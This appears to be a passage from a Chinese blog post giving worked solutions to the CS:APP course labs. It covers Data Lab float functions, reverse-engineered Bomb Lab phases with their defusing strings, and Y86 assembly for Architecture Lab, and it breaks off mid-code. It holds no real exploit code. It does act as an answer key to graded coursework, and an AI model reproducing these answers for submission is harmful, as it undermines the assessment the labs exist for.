class="number">0</span>;</span><br><span class="line">    <span class="comment">// 0比较特殊，先判断0(正负0都算作0)</span></span><br><span class="line">    <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 判断是否为NaN还是无穷大</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 指数减去偏移量，获取到真正的指数</span></span><br><span class="line">    <span class="built_in">exp</span> -= <span class="number">127</span>;</span><br><span class="line">    <span class="comment">// 需要注意的是，原来的frac一旦向左移位，其值就一定会小于1，所以返回0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 获取M，注意exp等于-127和不等于-127的情况是不一样的。当exp != -127时还有一个隐藏的1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">-127</span>)</span><br><span class="line">        frac |= (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    <span class="comment">// 要移位的位数。注意float的小数点是点在第23位与第22位之间</span></span><br><span class="line">    shiftBits = <span class="number">23</span> - <span class="built_in">exp</span>;</span><br><span class="line">    <span class="comment">// 需要注意一点，如果指数过大，则也返回0x80000000u</span></span><br><span class="line">    <span class="keyword">if</span> (shiftBits &lt; <span class="number">31</span> - <span class="number">23</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 获取真正的结果</span></span><br><span class="line">    frac &gt;&gt;= shiftBits;</span><br><span class="line">    <span class="comment">// 判断符号</span></span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">    <span class="comment">// 判断指数是否上溢或者下溢</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt; <span class="number">0xfe</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111056381.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111057616.png"></p><h1 id="Lab2-Bomb-Lab"><a href="#Lab2-Bomb-Lab" class="headerlink" title="Lab2:Bomb Lab"></a>Lab2:Bomb Lab</h1><p>拆炸弹,实际上就是逆向找绕过条件.<br>用IDA感觉直接秒了,不过练一下看汇编吧.<br>之前还真没有嗯看过汇编.<br>先根据跳转的地址将代码分成几个部分,从外向内识别每个循环体.</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>一个简单的字符串比较<br>payload:’Border relations with Canada have never been better.’</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>读入六个数字,第一个为1,下一个为上一个的两倍<br>payload:’1 2 4 8 16 32’</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>读入两个数字,第一个数字不大于7.<br>实现了一张跳转表,跳到跳转表的第一个条目,检查第二个数字是否是311.<br>payload:’1 311’<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111501156.png"></p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>主要逆这个函数了,可见var2==arg1的时候拆除炸弹.<br>payload:’7 0’</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func4(arg1,arg2,arg3)</span><br><span class="line">{</span><br><span class="line">    var1 = arg3-arg2;</span><br><span class="line">    var2 = arg2&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    var1 += var2;</span><br><span class="line">    var1 /= <span class="number">2</span>;</span><br><span class="line">    var2 = var1+arg2;</span><br><span class="line">    <span class="keyword">if</span>(var2&gt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4();</span><br><span class="line">    <span class="keyword">if</span>(var2&lt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4()+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>payload:ionefg</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">phase_5(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//a1即input_string的指针</span></span><br><span class="line">    var1 = a1;</span><br><span class="line">    <span class="keyword">if</span>(string_lenth(a1)!=<span class="number">6</span>)</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="comment">//将input_string中每个字符的第四位作为下标,从stringarray中取出字符,拷贝到str数组中.</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">            str[i] = StringArray[a1[i++]&amp;<span class="number">0xf</span>];</span><br><span class="line">    }<span class="keyword">while</span>(i&lt;<span class="number">6</span>);</span><br><span class="line">    str[<span class="number">6</span>]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span>(strings_not_equal(str,<span class="string">"flyers"</span>))</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解密脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">phase_5</span>(<span class="params">goal</span>):</span><br><span class="line">    stringarray = [ch <span class="keyword">for</span> ch <span class="keyword">in</span> string.ascii_lowercase + string.ascii_uppercase + string.digits]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> goal:</span><br><span class="line">        <span class="keyword">for</span> test <span class="keyword">in</span> stringarray:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(test)&amp;<span class="number">0xf</span> == i:</span><br><span class="line">                <span class="built_in">print</span>(test)</span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">phase_5([<span class="number">9</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>函数较长,分成__部分逆向.<br>代码部分是仅表示逻辑的伪代码,分支和循环尽量还原源码,使用下标代替指针增减.</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121206844.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>要注意的是,如果循环体的条件在开始时一定成立或为恒真式,汇编代码会省掉(一步)判断,这影响到对while、for等不同循环结构的判断.<br>如for(int i = 0;i!=24;),while(1);</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121500820.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//第一部分</span></span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二部分</span></span><br><span class="line">    last = <span class="number">7</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        nums[i] = <span class="number">7</span>-nums[i];</span><br><span class="line">    }<span class="keyword">while</span>(++i!=<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i!=<span class="number">6</span>;++i)</span><br><span class="line">    {</span><br><span class="line">       <span class="keyword">if</span>(nums[i]&gt;<span class="number">1</span>)</span><br><span class="line">       {</span><br><span class="line">            var3 = <span class="number">1</span>;</span><br><span class="line">            var2 = nodes;</span><br><span class="line">            <span class="keyword">do</span>{</span><br><span class="line">                    var2=var2-&gt;next;</span><br><span class="line">            }<span class="keyword">while</span>(++var3!=nums[i]);</span><br><span class="line">       }</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       {</span><br><span class="line">            var2 =  nodes;</span><br><span class="line">       }</span><br><span class="line">       arr[i] = var2;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141513827.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    i = <span class="number">1</span>;</span><br><span class="line">    last = <span class="number">6</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var2 = arr[i];</span><br><span class="line">        arr[j]-&gt;next = var2;</span><br><span class="line">        j = i;</span><br><span class="line">        <span class="keyword">if</span>(++i==last)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    arr[<span class="number">5</span>]-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    i = <span class="number">5</span>;</span><br><span class="line">    var3 = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        <span class="keyword">if</span>(*var3&lt;*(var3-&gt;next))</span><br><span class="line">            explode_bomb();</span><br><span class="line">        var3 = var3-&gt;next;</span><br><span class="line">    }<span class="keyword">while</span>(--i);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个流程:<br>第一部分读入六个数字到栈上的nums数组,检查每个数字都不大于6且各不相等.<br>(其实就是读1-6的数字排列)<br>第二部分将nums数组中每个数num = 7-num.并以此在栈上的arr指针数组中存放对应数字的结点指针.<br>第三部分根据arr指针数组的顺序重构nodes链表.最后遍历链表检查链表中值是否为递减排序.<br>递增排序nodes链表:”3 4 5 6 1 2”,故payload:”4 3 2 1 6 5”<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141525078.png"></p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>呃呃有一个隐藏关卡.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141553892.png"><br>发现进入条件是从0x603870读取两个数字和一个字符串,且字符串要为”DrEvil”.查看0x603870内容发现为phase_4的payload(逆一下read_line函数也能算出来),即只需该phase_4的payload为”7 0 DrEvil”即可进入.</p><p>读入一个小于1000的数字.进入fun7.<br>一个递归,观察ptr可以发现是一个二叉排序树的根节点.最后要使返回值为2.num应为22.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141656566.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fun7(ptr,num)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(!ptr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*ptr&gt;num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">8</span>),num);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(*ptr!=num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">16</span>),num)+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3:Attack Lab"></a>Lab3:Attack Lab</h1><p>这个就懒得做了,Linux下基本的ROP和shellcode还是比较熟的.</p><h1 id="Lab4-Architecture-Lab"><a href="#Lab4-Architecture-Lab" class="headerlink" title="Lab4:Architecture Lab"></a>Lab4:Architecture Lab</h1><p>说实话处理器这一章本来就看的云里雾里的.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:       </span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call sum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">sum_list:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp test</span><br><span class="line">test:</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            mrmovq (%rdi),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            jmp test</span><br><span class="line">            </span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">rsum_list:</span><br><span class="line">            xorq %rbx,%rbx</span><br><span class="line">            pushq %rbx</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne else</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line">else:</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            rmmovq %rcx,(%rsp)</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            mrmovq (%rsp),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:            </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">src:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad 0xc00</span><br><span class="line">dest:        </span><br><span class="line">            .quad 0x111</span><br><span class="line">            .quad 0x222</span><br><span class="line">            .quad 0x333</span><br><span class="line">main:</span><br><span class="line">            irmovq $3,%rdx</span><br><span class="line">            irmovq src,%rdi</span><br><span class="line">            irmovq dest,%rsi</span><br><span class="line">            call copy_block</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">copy_block:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp condition</span><br><span class="line">condition:</span><br><span class="line">            andq %rdx,%rdx</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            irmovq $8,%r8</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            addq %r8,%rdi</span><br><span class="line">            rmmovq %rcx,(%rsi)</span><br><span class="line">            addq %r8,%rsi</span><br><span class="line">            xorq %rcx,%rax</span><br><span class="line">            irmovq $1,%r8</span><br><span class="line">            subq %r8,%rdx</span><br><span class="line">            jmp condition</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>根据IADDQ指令执行的六个阶段,添加一下需要用到的sig就行了.<br>挺简单的,这里就不贴出来了.</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="iaddq"><a href="#iaddq" class="headerlink" title="iaddq"></a>iaddq</h3><p>和Part B一样添加iaddq指令</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>先6路+3路循环展开得到CPE9.15、Score27.0</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line"># Loop header</span><br><span class="line">xorq %rax,%rax# count = 0;</span><br><span class="line">andq %rdx,%rdx# len &lt;= 